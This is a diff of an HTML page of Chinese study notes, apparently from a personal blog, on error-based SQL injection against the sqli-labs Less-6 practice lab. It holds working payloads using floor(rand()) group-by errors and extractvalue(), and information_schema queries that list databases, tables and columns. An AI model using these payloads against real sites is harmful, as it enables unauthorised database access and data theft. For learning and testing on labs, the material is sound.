@@ -225,16 +225,26 @@
 <p>以sqli-labs中less6为例</p>
 <p>union注入不会回显列信息，故使用报错注入</p>
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/less6.png" alt="image-20210509204534799"></p>
-<p>查数据库</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br><span class="line"></span><br><span class="line">(select * from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)</span><br></pre></td></tr></table></figure>
+<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">database()的位置可以嵌套sql语句进行查询</span><br><span class="line"></span><br><span class="line">//也可以通过information_schema.schemata表中的schema_name列查库</span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>
 
 
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="image-20210509205248015"></p>
 <blockquote>
 <p>security后面的1是floor(rand(0)*2)产生的数字1</p>
 </blockquote>
+<h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样查询的结果是只会显示一个字段，不加`limit <span class="number">0</span>,<span class="number">1</span>`又会报错`Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span>`</span><br><span class="line"></span><br><span class="line">解决办法：使用group_concat()函数查出所有内容</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/table_name.png" alt="table_name"></p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(table_name).png" alt="group_concat(table_name)"></p>
+<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E5%88%97.png" alt="image-20210510090611516"></p>
+<p>但是在查数据时会遇见一个奇怪的问题，使用*group_concat()*也出不来数据</p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(id,username,password).png" alt="group_concat(id,username,password)"></p>
 <p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
-<h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
+<h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><blockquote>
+<p>MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数</p>
+</blockquote>
+<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
 <blockquote>
 <p>XML_document 是 String 格式，为 XML 文档对象的名称</p>
 <p>XPath_string (Xpath 格式的字符串)</p>
@@ -243,9 +253,10 @@
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="number">0x7e</span>是<span class="operator">~</span>的ASCII码</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将<span class="keyword">user</span>()换成其他payload</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220649223.png" alt="image-20210509220649223"></p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220711553.png" alt="image-20210509220711553"></p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220732609.png" alt="image-20210509220732609"></p>
+<p>查库查表正常进行就行</p>
+<h4 id="有意思的来了"><a href="#有意思的来了" class="headerlink" title="有意思的来了"></a>有意思的来了</h4><p>当查列的时候会因为超过最大限度32位只会显示部分数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; ),0x7e))--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/extractvalue%E6%9F%A5%E5%88%97.png" alt="image-20210510100413545"></p>
 <p>参考文章：</p>
 <p><a href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
 <p><a href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
